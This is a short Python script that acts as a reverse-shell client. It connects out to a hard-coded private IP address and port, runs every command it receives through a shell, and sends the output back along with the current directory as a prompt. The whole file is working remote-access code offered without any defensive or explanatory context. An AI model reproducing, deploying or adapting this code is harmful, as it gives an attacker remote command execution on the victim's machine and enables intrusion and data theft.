# -*- coding: utf-8 -*-
"""
Created on Mon Dec 24 03:03:13 2018

@author: CAPTAIN
"""

import socket
import os
import subprocess



def create_socket():
    global HOST, PORT, s
    HOST='192.168.0.105'
    PORT=10009
    
    try:
        s=socket.socket()
        print("Socket Created")
    except:
        print("Error while creating socket")

def establish_connection():
    global HOST, PORT, s
    
    try:
        s.connect((HOST,PORT))
        print("Connection Established")
        
    except:
        print("Error while establishing connection")


def receive_commands():
    global s
    
    while True:
        command=s.recv(500000)
        command= command.decode('utf-8')
        
        a= subprocess.Popen(command,shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if command=='cd':
            s.send(str.encode(os.getcwd()+">> "))
        
        else:
            output = a.stdout.read() + a.stderr.read()
            output=output.decode("utf-8")
            s.send(str.encode(os.getcwd()+">> "+output))




create_socket()
establish_connection()
receive_commands()

